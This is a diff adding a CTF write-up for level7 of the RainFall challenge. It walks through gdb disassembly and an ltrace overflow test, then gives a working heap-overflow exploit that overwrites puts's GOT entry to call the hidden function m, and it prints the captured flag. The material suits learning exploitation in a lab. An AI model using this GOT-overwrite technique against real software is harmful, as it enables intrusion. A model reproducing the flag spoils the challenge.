@@ -1,0 +1,121 @@
+# First, let's look at the level7 binary at the root of the repository
+# When testing it, we can see that it's waiting for at least 2 arguments (it segfault if less)
+# Let's take a look of the main and functions in the program
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048521 <+0>:	push   %ebp
+   0x08048522 <+1>:	mov    %esp,%ebp
+   0x08048524 <+3>:	and    $0xfffffff0,%esp
+   0x08048527 <+6>:	sub    $0x20,%esp
+   0x0804852a <+9>:	movl   $0x8,(%esp)
+   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
+   ...
+   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
+   ...
+   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
+   ...
+   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
+   ...
+   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
+   ...
+   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+   ...
+   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
+   ...
+   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+   0x080485fc <+219>:	mov    $0x0,%eax
+   0x08048601 <+224>:	leave  
+   0x08048602 <+225>:	ret    
+End of assembler dump.
+
+# It's very long because it does a lot of malloc (4)
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0804836c  _init
+0x080483b0  printf
+...
+0x080484d0  frame_dummy
+0x080484f4  m
+0x08048521  main
+0x08048610  __libc_csu_init
+...
+0x080486bc  _fini
+
+# We can see thanks to info functions command in gdb that there is a function 'm'
+
+(gdb) disas m
+Dump of assembler code for function m:
+   0x080484f4 <+0>:	push   %ebp
+   0x080484f5 <+1>:	mov    %esp,%ebp
+   0x080484f7 <+3>:	sub    $0x18,%esp
+   0x080484fa <+6>:	movl   $0x0,(%esp)
+   0x08048501 <+13>:	call   0x80483d0 <time@plt>
+   0x08048506 <+18>:	mov    $0x80486e0,%edx
+   0x0804850b <+23>:	mov    %eax,0x8(%esp)
+   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
+   0x08048517 <+35>:	mov    %edx,(%esp)
+   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
+   0x0804851f <+43>:	leave  
+   0x08048520 <+44>:	ret    
+End of assembler dump.
+
+# After checking of all the code (more explicit in source.c) we can see two memory areas that are allocate to cpy argv[1] and argv[2] in
+# Thoses areas have a certain width (8) here
+# After malloc we can see two strcpy that save in two variables argv[1] and argv[2]
+# Then, we can see a fopen that will read the file "/home/user/level8/.pass", that's interesting
+# After, we can see the function fgets, fgets will read on the file and save the content in a global variable (of 68 bytes long)
+# And puts "~~" at the end of the main
+#
+# For the m function, we can see that it returns the printf function which it will print the content of the global variable (the file content)
+# and write the actual timestamp (not usefull for us)
+#
+# Now we know all of that, we supposed that we have to execute m after the execution of fgets that will write the content of the file in the global variable
+# The only function we can use is puts, let's take a look at this one
+
+(gdb) disas puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+
+# The first line is interesting 0x08048400 <+0>:	jmp    *0x8049928
+# We can try to modify the address of the jmp to the address of 'm' function
+# Strcpy are reading on argv[1] and argv[2], that's what we have to use to exploit a buffer, maybe?
+# There is a lot of malloc here, let's take a buffer on https://wiremask.eu/tools/buffer-overflow-pattern-generator/ and see what we happend with ltrace
+
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+__libc_start_main(0x8048521, 3, 0xbffff714, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                       = 0x0804a008
+malloc(8)                                                       = 0x0804a018
+malloc(8)                                                       = 0x0804a028
+malloc(8)                                                       = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
+strcpy(0x37614136, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"... <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+# We can see our 4 mallocs, not very usefull, what is interesting here is where the 2nd strcpy is writting on
+# It's writting on the address 0x37614136 and not on one of our malloc, let's check if it match with our buffer on the website
+# And yes! It gives us an offset of 20, we can now say that we modify the written value of the 2nd strcpy with the first one by doing a buffer overflow
+# Nice! Remind that the idea here is to execute the 'm' function thanks the 'puts' function
+#
+# Now we know that we have to print 20 bytes before writting what we want on the memory
+# Let's write the address of the jmp call in puts function (0x08048400 <+0>:	jmp    *0x8049928) in our buffer to replace them by the address of 'm' (0x080484f4)
+# Remind that we use puts because it's the function called after the write in the global variable by fgets
+# argv[1] = "A" * 20 + "\x28\x99\x04\x08" (<= address of jmp in puts)
+# argv[2] = "\xf4\x84\x04\x08" (<= address of 'm' function to overwrite)
+
+level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1706280335
+
+# Ow our flag is here, that works!
+# 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
